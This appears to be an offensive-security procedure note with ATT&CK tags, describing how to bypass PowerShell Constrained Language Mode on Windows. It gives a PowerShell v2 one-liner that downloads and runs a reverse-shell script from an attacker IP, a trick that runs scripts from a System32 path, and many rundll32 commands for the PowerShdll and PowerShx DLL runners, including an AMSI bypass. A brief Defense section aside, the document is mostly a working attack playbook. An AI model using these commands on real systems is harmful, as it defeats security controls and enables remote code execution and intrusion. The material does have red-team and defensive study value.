---
type: procedure
description: >-
  This procedure demonstrates techniques to bypass PowerShell's Constrained
  Language Mode (CLM) using PowerShell v2, System32 path tricks, and custom DLL
  runners like PowerShdll and PowerShx to execute arbitrary code.
verified: true
submitted: false
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Constrained Language Mode]]'
  - '[[tags/Powershell]]'
  - '[[tags/Windows - Defenses]]'
commands:
  - '[[commands/powershell-v2-download-execute-script]]'
  - '[[commands/rundll32-powershdll-help]]'
  - '[[commands/rundll32-powershdll-execute-inline-script]]'
  - '[[commands/rundll32-powershdll-execute-script-file]]'
  - '[[commands/rundll32-powershdll-interactive-new-window]]'
  - '[[commands/rundll32-powershdll-interactive-current-window]]'
  - '[[commands/rundll32-powershx-execute-inline-script]]'
  - '[[commands/rundll32-powershx-execute-script-file]]'
  - '[[commands/rundll32-powershx-execute-script-with-cmdlet]]'
  - '[[commands/rundll32-powershx-interactive-new-window]]'
  - '[[commands/rundll32-powershx-interactive-current-window]]'
  - '[[commands/rundll32-powershx-bypass-amsi]]'
  - '[[commands/rundll32-powershx-print-execution-output]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerShdll]]'
  - '[[tools/PowerShx]]'
validated: true
---

# Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner

## Summary

This procedure outlines methods to bypass PowerShell's Constrained Language Mode (CLM), a security feature that restricts script functionality to prevent malicious execution. By leveraging PowerShell v2, path-based trust assumptions, and custom DLL runners like PowerShdll and PowerShx, attackers can execute arbitrary code in restricted environments, enabling further post-exploitation activities such as persistence or data exfiltration.

## Description

Constrained Language Mode (CLM) limits PowerShell to a safe subset of commands and features, often enforced via environment variables like __PSLockdownPolicy. This procedure covers multiple bypass techniques: downgrading to PowerShell v2 (which lacks CLM support), exploiting trusted paths like System32 to elevate language mode, and using signed binary proxy execution via rundll32 with custom PowerShell-in-DLL tools. These methods allow loading and running unrestricted PowerShell scripts or interactive sessions. The target environment is Windows systems with PowerShell 5.0+ where CLM is enabled, typically in enterprise settings with AppLocker or similar controls. Success enables full PowerShell capabilities for evasion and execution.

## Requirements

1. Administrative or user-level access to a Windows system with PowerShell installed (version 5.0 or higher for CLM enforcement).
2. Download and place PowerShdll.dll and PowerShx.dll in a accessible directory (e.g., from GitHub repositories).
3. Network access if downloading remote scripts (for v2 method).
4. A listener or remote script (e.g., rev.ps1) for testing reverse shells or payloads.

## Defense

- Implement application whitelisting with AppLocker or WDAC to block unsigned DLLs and rundll32 executions of non-standard libraries.
- Monitor PowerShell logging (Module, ScriptBlock, and Transcription) for v2 invocations, unusual rundll32 calls, or CLM policy changes.
- Enforce strict PowerShell execution policies and monitor environment variable modifications like __PSLockdownPolicy.
- Use EDR tools to detect anomalous DLL loading in PowerShell processes and network downloads in v2 sessions.

## Objectives

1. Downgrade to or simulate unrestricted PowerShell execution to bypass CLM restrictions.
2. Load and execute arbitrary scripts or start interactive consoles in a CLM-enabled session.
3. Achieve full language mode for malicious code execution, enabling persistence, lateral movement, or data exfiltration.

## Instructions

### Step 1: Bypass CLM Using PowerShell v2 for Remote Script Download and Execution

**Context**: PowerShell v2 does not support CLM, allowing unrestricted execution. Use this to download and invoke a remote script, bypassing modern security features in v5+.

**Command** ([[commands/powershell-v2-download-execute-script]]):
```powershell
powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://$_ATTACKER_IP/rev.ps1')"
```

> This command starts PowerShell v2 with execution policy bypassed, downloads a script from the attacker's server, and executes it inline via IEX. Replace $_ATTACKER_IP with the attacker's IP. Expected output includes the script's execution results, such as a reverse shell connection if rev.ps1 contains one.

### Step 2: Demonstrate CLM Bypass via System32 Path Execution

**Context**: PowerShell trusts scripts executed from System32 as Microsoft binaries, switching from ConstrainedLanguage to FullLanguage mode. First enable CLM, create a test script, and execute it from different paths to verify the bypass.

**Code** ([[codes/clm-bypass-system32-path-demonstration]]):
```ps1
# Enable CLM from the environment
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
Get-ChildItem -Path Env:

# Create a check-mode.ps1 containing your "evil" powershell commands
$mode = $ExecutionContext.SessionState.LanguageMode
write-host $mode

# Simple bypass, execute inside a System32 folder
PS C:\> C:\Users\Public\check-mode.ps1
ConstrainedLanguage

PS C:\> C:\Users\Public\System32\check-mode.ps1
FullLanguage
```

> Run the environment setup to enable CLM (requires admin). Create check-mode.ps1 with the mode check command. Execute from a non-trusted path (shows ConstrainedLanguage) then copy to System32 and re-execute (shows FullLanguage). This confirms the bypass; replace the check with malicious code.

### Step 3: Setup and View Help for PowerShdll

**Context**: PowerShdll is a DLL that embeds PowerShell for unrestricted execution via rundll32. Download it from the tool's repository and use help to review options before execution.

**Command** ([[commands/rundll32-powershdll-help]]):
```cmd
rundll32 PowerShdll,main -h
```

> This displays usage information for PowerShdll, including flags for script execution and interactive modes. Expected output: A help message listing arguments like -f for file execution, -w for new window console.

### Step 4: Execute Inline Script with PowerShdll

**Context**: Load and run a PowerShell script directly as an argument to bypass CLM without file drops.

**Command** ([[commands/rundll32-powershdll-execute-inline-script]]):
```cmd
rundll32 PowerShdll,main "$_INLINE_SCRIPT"
```

> Replace $_INLINE_SCRIPT with the PowerShell code (e.g., a one-liner for testing). Expected output: The script's execution in full mode, bypassing CLM.

### Step 5: Execute Script File with PowerShdll

**Context**: Run a local PowerShell script file using PowerShdll for persistent or complex payloads.

**Command** ([[commands/rundll32-powershdll-execute-script-file]]):
```cmd
rundll32 PowerShdll,main -f "$_SCRIPT_PATH"
```

> Specify $_SCRIPT_PATH to the .ps1 file. Expected output: Script runs unrestricted; use for payloads like reverse shells.

### Step 6: Start Interactive Console with PowerShdll (New Window)

**Context**: Launch a full PowerShell console in a new window for interactive post-exploitation.

**Command** ([[commands/rundll32-powershdll-interactive-new-window]]):
```cmd
rundll32 PowerShdll,main -w
```

> Opens a new console window with full language mode. Expected output: Interactive PowerShell prompt without CLM restrictions.

### Step 7: Start Interactive Console with PowerShdll (Current Window)

**Context**: Same as above but in the current console for stealthier execution.

**Command** ([[commands/rundll32-powershdll-interactive-current-window]]):
```cmd
rundll32 PowerShdll,main -i
```

> Expected output: Full PowerShell prompt in current window.

### Step 8: Setup and View Help for PowerShx (Similar to PowerShdll)

**Context**: PowerShx is an advanced variant with additional features like AMSI bypass. Review help first.

Use the same help command pattern as PowerShdll, but with PowerShx.dll (details in [[tools/PowerShx]]). Proceed to specific executions.

### Step 9: Execute Inline Script with PowerShx

**Context**: Run inline code with extra options like cmdlet invocation.

**Command** ([[commands/rundll32-powershx-execute-inline-script]]):
```cmd
rundll32 PowerShx.dll,main -e "$_INLINE_SCRIPT"
```

> Expected output: Unrestricted execution of the script.

### Step 10: Execute Script File with PowerShx and Optional Cmdlet

**Context**: Load a script and run a specific cmdlet from it, useful for targeted actions.

**Command** ([[commands/rundll32-powershx-execute-script-file]]):
```cmd
rundll32 PowerShx.dll,main -f "$_SCRIPT_PATH"
```

**Command** ([[commands/rundll32-powershx-execute-script-with-cmdlet]]):
```cmd
rundll32 PowerShx.dll,main -f "$_SCRIPT_PATH" -c "$_CMDLT_NAME"
```

> For basic file exec, use first; add -c $_CMDLT_NAME (e.g., Invoke-WebRequest) for specific calls. Expected output: Script or cmdlet results in full mode.

### Step 11: Attempt AMSI Bypass with PowerShx

**Context**: PowerShx can attempt to disable Antimalware Scan Interface (AMSI) for safer script execution.

**Command** ([[commands/rundll32-powershx-bypass-amsi]]):
```cmd
rundll32 PowerShx.dll,main -s
```

> Expected output: AMSI disabled if successful (test with known AMSI-triggered script).

### Step 12: Start Interactive Console with PowerShx (New or Current Window)

**Context**: Launch unrestricted consoles similar to PowerShdll.

**Command** ([[commands/rundll32-powershx-interactive-new-window]]):
```cmd
rundll32 PowerShx.dll,main -w
```

**Command** ([[commands/rundll32-powershx-interactive-current-window]]):
```cmd
rundll32 PowerShx.dll,main -i
```

> Expected output: Full PowerShell prompt.

### Step 13: Print Execution Output with PowerShx

**Context**: Enable verbose output for debugging executed scripts.

**Command** ([[commands/rundll32-powershx-print-execution-output]]):
```cmd
rundll32 PowerShx.dll,main -v
```

> Use with other flags (e.g., -f) to see results. Expected output: Console-printed script output.
